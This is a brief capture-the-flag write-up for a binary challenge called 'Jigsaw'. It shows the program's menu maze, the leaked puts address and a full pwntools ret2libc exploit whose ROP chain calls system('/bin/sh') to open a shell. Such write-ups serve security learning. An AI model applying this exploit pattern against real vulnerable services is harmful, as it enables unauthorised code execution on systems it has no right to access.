# Jigsaw

## Solution

This challenge presents another ret2libc vulnerability. First, this challenge provides a minor maze of sorts, which can be solved by typing `2` then `1` then `1`. After this, the binary leaks `puts` and then allows for a buffer overflow:
```
Pick your poison: 
1. Razor Wire Trap 
2. Reverse Bear Trap 
2
You live another day Amanda Young.
Which one will survive: 
1. Ankle Chain  Trap 
2. Flammable Jelly Trap 
1
You live for now Lawrence Gordon.
Choose your fate: 
1. Oxygen Crusher Trap 
2. Red Helix Trap 
1
You have survived William Easton
It seems you made it through.
I am PUTting your reward here: 0x7f96c77ad5a0
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
```
This, we can follow a basic ret2libc exploit structure (dealing with `movaps`) to get the shell:
```python
p = start()

p.sendlineafter(b'Bear Trap', b'2')
p.sendlineafter(b'Jelly Trap', b'1')
p.sendlineafter(b'Helix Trap', b'1')

p.recvuntil(b'here: 0x')
leak = int(p.recvline().decode('utf-8').strip(), 16)
libc.address = leak - libc.sym['puts']

r = ROP(libc)
payload = cyclic(16)
payload += p64(r.find_gadget(['ret'])[0])
payload += p64(r.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(libc.sym['system'])
p.sendline(payload)

p.interactive()
```